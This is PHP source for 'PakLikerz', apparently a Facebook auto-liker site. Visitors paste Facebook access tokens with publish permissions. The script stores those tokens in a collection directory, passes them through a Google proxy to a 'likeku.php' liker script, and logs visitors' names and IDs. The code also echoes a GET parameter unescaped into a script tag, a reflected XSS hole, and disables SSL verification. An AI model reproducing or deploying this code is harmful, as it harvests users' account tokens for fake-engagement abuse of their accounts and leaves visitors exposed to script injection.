<?php
session_start();
// JSONURL //
function get_html($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
function get_json($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return json_decode($data);
}
if($_SESSION['token']){
$token = $_SESSION['token'];
$graph_url ="https://graph.fb.me/me?access_token=" . $token;
$user = get_json($graph_url);
if ($user->error) {
if ($user->error->type== "OAuthException") {
session_destroy();
error_reporting(0);
$cut = explode('&',$token);
unlink('kumpul/'.$cut[0]);
if(!is_dir('expired')){
mkdir('expired');
}
$v=fopen('expired/'.$cut[0],'w');
fwrite($v,1);
fclose($v);
header('Location: index.php?i=Token Expired...Generate new token to login');
}
}
}

if(isset($_POST['submit'])) {
$token2 = $_POST['token'];
if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
$token = $matches[1];
}
else{
$token = $token2;
}
$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
$pos = strpos($extend, "publish_stream");
if ($pos == true) {
$_SESSION['token'] = $token;
}
else {
session_destroy();
header('Location: index.php?i=gunakan token SKYPE brow biar awet');}

}else{}
if(isset($_POST['logout'])) {
session_destroy();
error_reporting(0);
$cut = explode('&',$token);
unlink('kumpul/'.$cut[0]);
$v=fopen('expired/'.$cut[0],'w');
fwrite($v,1);
fclose($v);
header('Location: index.php?i=Terimakasih Atas kunjunganya, token anda berhasil terhapus');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}

?>
<?php include 'css.php';?>
<?php
error_reporting(0);
$lamafile = 900;
$waktu = time();
if ($handle = opendir('block')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('block/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('block/'.$file);
}
closedir($handle);
}
?>
<?php
$like = new like();
if($_GET[act]){
print '<script>top.location.href="https://www.facebook.com/dialog/oauth?scope=publish_actions,user_photos,friends_photos,user_activities,user_likes,user_status,friends_status,publish_stream,read_stream,status_update&redirect_uri=https://login.skype.com/COPY_ALL_THIS_URL&response_type=token&client_id=260273468396"</script>';
}
if($_SESSION['token']){
$access_token = $_SESSION['token'];
$me = $like -> me($access_token);
if($me[id]){
if($limit = fileatime('block/'.$me[id])){
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo'

<div class="paging"><font color="green"><b>Increase Likes On Your Facebook Status, Gain Fame</b></font></div>
<div class="pesan"><font color="red">Wait Second 15:00</font> = <font color="red">'.$cek.'</font></div>
';
}else{
echo'
<div class="paging"><font color="green"><b>Increase Likes On Your Facebook Status, Gain Fame</b></font></div>
<div class="pesan">
--> Next Submit Ready! <--
</div>
';
}
echo'
<div class="menu"><h3>Welcome Back '.$me[first_name].'</h3>
<div class="pesan">
<a href="http://facebook.com/'.$me[id].'"><img src="https://graph.facebook.com/'.$me[id].'/picture?type=large" alt="Profile" style="height:80px;width:70px;-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red"/> </a>
<br>
<div align="left">
Your Name: <b> '.$me[name].'</b></br>
Profile ID: <b> '.$me[id].'</b>
</div><br>
<form action="logout.php">
<input type="submit" value="Log Out" class="gmenu" style="border:1px solid #0000FF;">
</form>
</div></div>
';



$like -> kumpul($access_token);
if($_POST[id]){
if($limit = fileatime('block/'.$me[id])){
echo'

';
exit;
}
date_default_timezone_set("Asia/Jakarta");
$array_hari = array(1=>'Senin','Selasa','Rabu','Kamis','Jumat','Sabtu','Minggu');
$hari = $array_hari[date('N')];
$tanggal = date('j');
$array_bulan = array(1=>'Januari','Februari','Maret','April',
'Mei','Juni','Juli','Agustus','September','
Oktober', 'November','Desember');
$bulan = $array_bulan[date('n')];
$tahun = date('Y');
$tgl = $hari.', '.$tanggal.' '. $bulan.' '.$tahun;

$pejoh = fopen("last_id.html","w");
fwrite($pejoh, "$me[id]");
fclose($pejoh);

$njir = fopen("last_info.html","w");
fwrite($njir, "Name: <b>");
fwrite($njir, "$me[name]");
fwrite($njir, "</b><br/>Last Submit: <b>");
fwrite($njir, "$tgl");
fwrite($njir, "</b>");
fclose($njir);

$file = "ember.php";
$handle = fopen($file, 'a');
fwrite($handle, "$me[name]");
fwrite($handle, "\n");
fwrite($handle, "<input size=2 type=text value=$me[id]> <a href=https://m.facebook.com/$me[id]>Go FB</a>");
fwrite($handle, "<br>");
fclose($handle);
if(!is_dir('block')){
mkdir('block');
}
$bg=fopen('block/'.$me[id],'w');
fwrite($bg,1);
fclose($bg);
$like -> pancal($_POST[id]);
$like -> suntik($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {

public function pancal($id){ for($i=1;$i<2;$i++){
$this->
_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/sks.php?post=ktb'.$id));
$this->
_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likeku.php?liker='.$_SESSION['token']));
}
print '
<div class="list">
<div class="aclb apl"> <div class="acw fclb" style="margin:4px;" align="center">

<div class="container"><div class="alert alert-success"><button type="button" class="close" data-dismiss="alert">&times;</button> <b>Likes has been successfully sent...</b><br/>
</div></div>
<br><center>
<form action="index.php">
<input type="submit" value="Back Home" class="gmenu" style="border:1px solid #0000FF;">
</form></center></div></div></div></div>';
}

public function suntik($id){ for($i=1;$i<2;$i++){
$this->
_req('http://'.$_SERVER[HTTP_HOST].'/jarum.php?post=ktb'.$id);
}
}

public function me($access){
return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
}

public function kumpul($access){
if(!is_dir('kumpul')){
mkdir('kumpul');
}
$cut = explode('&',$access);
$a=fopen('kumpul/'.$cut[0],'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print '
<div class="acr apl">
Invalid Access Token
</div>
';
$this->form();
}

public function form(){
$kas = file_get_contents('show2.txt');
$kas = explode("n",$kas);
$lih = $kas[mt_rand(0,count($kas)-1)];
echo'

<center><div class="menu">
<div class="list">PakLikerz is a social marketing system that will Increase Likes on facebook. Our system is based on an online community of users who look get Likes quickly and easily.</div></div>
<div class="menu">
<div class="list">
Get Instant 200+ Likes per submit and UP-TO 1000 Likes on your Statuses, Pictures, Albums and other facebook Posts for <b>FREE</b>.
</div></div>
<div class="menu"><h3><center> Method Login To PakLikerz</center></h3>
<div class="pesan"><center><b>Get Access Token</b></center></div>
<div class="pop3"> <center><hr>
&rarr; <a href="dementoken1.php"><b>TOKEN NOKIA</b></a> &larr;<hr>
&rarr; <a href="dementoken2.php"><b>TOKEN HTC 1</b></a> &larr;<hr>
&rarr; <a href="dementoken3.php"><b>TOKEN HTC 2</b></a> &larr;<hr>
Make Sure Everything Is <b>Public</b> In Your Facebook<br>
<a href="https://m.facebook.com/settings/subscribe/?refid=31"><b>Facebook Follower [Setting]</b></a></center></div>
<div class="pesan">
<center><center><form
method="get" class="composer_form" id="composer_form" action="login.php">
<input class="inp-text" style="width:80%;text-align:center"
name="user" rows="2" cols="15" value="'.$_SESSION['token'].'" type="text"></center><center><td class="btnCell"> <input value="Submit" type="submit" class="gmenu"/></td></center></tr></table>
</form></center>
</div></div>
</center>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.fb.me/me/feed?access_token='.$access.'&limit=5'),true);
if(count($feed[data]) >= 1){
echo '
<br>
Select Status :
<div align="center">
<div class="list"><b>Custom Post ID :</b>
<div id="search-form"><div class="pesan"><form action="index.php" method="post"/>
<input type="text" style="width:100%;text-align:center"
name="id" class="inp-text"/>
<input type="hidden"
name="access_token" value="'.$access.'"/>
<input name="suntik" type="submit" value="Submit" class="phdr"/></div></div></div>
</form></div></div>
';

for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

<div class="post-meta" style="margin-top:4px;margin-left:2px;margin-bottom:4px;margin-right:2px;">
<td valign="top" class="aps">
<img src="http://graph.facebook.com/'.$uid.'/picture" alt="Member Jempol" />
</td>
<div align="left"><td valign="top" class="l">
<span class="mfss">
<a href="http://facebook.com/'.$uid.'" class="sec">
'.$name.'
</a>
</span><br/>
<span class="mfss fcg">
<abbr>
type =<font color="red"> [ '.$type.' ]</font>
</abbr>
<b>
<span class="fcg mfss">
</span>
</b>
</span></div>
</div></div>';

if($type=='photo'){
echo '
<br/>
<br>
<img src="'.$pic.'" alt=""class="imgCrop img" style="width:100%;height:100%;left:0;top:0;" />
<span>
'.$mess.'
</span>
';
}else{
echo '
<br/>
<span>
'.$mess.'
</span>
';
}
echo '
</td>
<div id="search-form"><div align="right">
<form action="index.php" method="post"/>
<input type="text" style="width:100%; solid align:right" name="id" value="'.$id.'"/>
<input type="hidden" name="id" value="'.$id.'"/>
<input type="hidden" name="access_token" value="'.$access.'"/>
<input name="pancal" type="submit" value="Submit" class="phdr"/>
</form>
</div></div>
</div>
</div>
</div>';
}
}else{
print '
<div id="objects_container"><div class="acy aps abb"><span class="mfss">errOr... Your status not found
</span></div></div></div>
</div>';
}
print '
</div>
';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
)
);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<?php include 'depelovers.php';?>
<?php include 'footer.php';?>
</body>
</html>
